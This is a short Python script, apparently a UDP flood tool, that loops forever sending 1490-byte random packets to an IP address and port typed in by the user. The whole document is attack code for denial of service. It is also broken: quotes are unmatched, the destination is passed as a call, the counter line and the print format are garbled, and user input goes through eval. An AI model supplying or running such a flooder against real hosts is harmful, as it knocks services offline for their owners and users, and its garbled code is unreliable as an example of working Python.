import socket
import random

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = input(ENTER ip ADDRESS: ")
port = eval(input(ENTER port: "))
sent = 0

while True:
    sock.sendto(bytes,ip(ip,port))
    sent = sent = sent+1
    print("Sent s packet to s through port : s"(sent,ip,port))
